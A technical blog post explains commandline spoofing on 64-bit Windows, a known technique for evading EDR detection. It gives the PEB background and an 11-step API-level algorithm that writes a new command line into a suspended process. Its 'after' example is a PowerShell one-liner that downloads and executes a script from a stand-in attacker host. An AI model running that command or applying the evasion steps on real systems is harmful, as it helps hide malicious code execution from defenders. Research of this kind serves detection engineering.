# Commandline spoofing on Windows
So, in this blogpost I wanted to cover a well-known technique with a limitation that is not well-documented.  
I hope to share some slight insights on Windows process creation and internals.  
The topic of today is spoofing process commandlines on Windows.  
To be relevant, I will only be describing the technique on 64-bit Intel architecture, which is the most prevalent Windows architecture in the world. The differences between that and other architectures are minor, and mostly come into play when examining the data structures used throughout the blogpost.

## Motivation
The technique's idea (which I haven't invented myself!) is to start a suspended process, wait a bit, and by modifying the process's memory - change its commandline and resume it.  
The main motivation for spoofing commandlines on Windows is evading [EDR](https://en.wikipedia.org/wiki/Endpoint_detection_and_response) detections.  
Imagine an EDR that intercepts a process's commandline upon its creation and saves it in some cache - by changing the process's commandline later, an EDR might report something that looks benign but is actually malicious - think [Living-off-the-land binaries (LOLBins)](https://lolbas-project.github.io) or even script engines:

### Before
```
powershell -c "Write-Host 'This is a test'"
```

### After
```
powershell -c "iex (New-Object System.Net.WebClient).DownloadString('http://attacker-controlled.com/evil.ps1')"
```

Note this example is not great since the length of the old commandline is smaller than the new commandline length - we will discuss that shortly.

## Background - PEB
I did mention what the PEB is in the past [when I talked about shellcodes](https://github.com/yo-yo-yo-jbo/msf_shellcode_analysis/), but for the sake of completion, I will mention it briefly here too.  
The [Process Environment Block (PEB)](https://en.wikipedia.org/wiki/Process_Environment_Block) is a semi-documented data structure in Windows, meant to be a semi userland copy of the kernel [EPROCESS](https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/ps/eprocess/index.htm) structure.  
The motivation for keeping two structures is to save costs - for instance, by consulting the `PEB`, a process can know what DLLs are loaded to it or what commandline it has without consulting the kernel.  
Specifically, we are going to care about the fact the process's commandline is also resident in its PEB.

## Previous known work
In this section, I will try to describe the main logic that can be found in many places all over the internet.  
Note I have found buggy implementations as well, so in this section I will try to be extra accurate.  
Also, this algorithm (and all those proof-of-concepts) assume the old commandline length is not shorter than the new commandline length.  
I will be diving deeply into that assumption later and see what could be done about it.  
In any case, here is the complete algorithm:
1. Validate that the length of the new commandline does not exceed the length of the old commandline. That assumption will become clear in bullet number 8.
2. Create a new process using the [CreateProcessW](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw) API, specifying `CREATE_SUSPENDED` in its creation flags and obviously using the old commandline. We get back two `HANDLE`s - one for the created process and one for the main (and only) thread.
3. Optionally sleep for a while (e.g. using [Sleep](https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-sleep) API) to let the EDR time to capture the old (and legitimate-looking) commandline.
4. Use the [ntdll!NtQueryInformationProcess](https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess) API on the process handle, with the `ProcessBasicInformation` information class. We get back a `PROCESS_BASIC_INFORMATION` structure, which has the remote process's [PEB](https://en.wikipedia.org/wiki/Process_Environment_Block) address.
5. Invoke the [ReadProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory) API to read the remote process's PEB (since we got its address). Specifically, we care about the `ProcessParameters` structure, which is a pointer.
6. Invoke the [ReadProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory) API again, this time to read the `ProcessParameters`, of type [RTL_USER_PROCESS_PARAMETERS](https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-rtl_user_process_parameters). Just like the `PEB`, `RTL_USER_PROCESS_PARAMETERS` is a semi-documented structure. Most importantly, it contains a field called `CommandLine`, of type [UNICODE_STRING](https://learn.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-_unicode_string).
7. Note at this point we have `CommandLine.MaximumLength` (corresponds to the string buffer's capacity, in bytes, including a NUL terminator) and `CommandLine.Length` (corresponds to the string's length in characters, excluding the NUL terminator). We also have `CommandLine.Buffer`, which for all means and purposes - is a pointer.
8. We use the [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) API to write our new commandline to `CommandLine.Buffer`. **This is exactly where the assumption about the commandline lengths come into play** - if the new commandline is longer than the old commandline, we write outside of the buffer!
9. We use the [WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) API again to update `CommandLine.Length` to the new length of the commandline (assuming it's different than the old commandline length).
10. We call the [ResumeThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread) API on the main thread's `HANDLE`, which resumes the entire process execution.
11. For cleanup, we invoke the [CloseHandle](https://learn.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle) API on both the process and the thread `HANDLE`s.



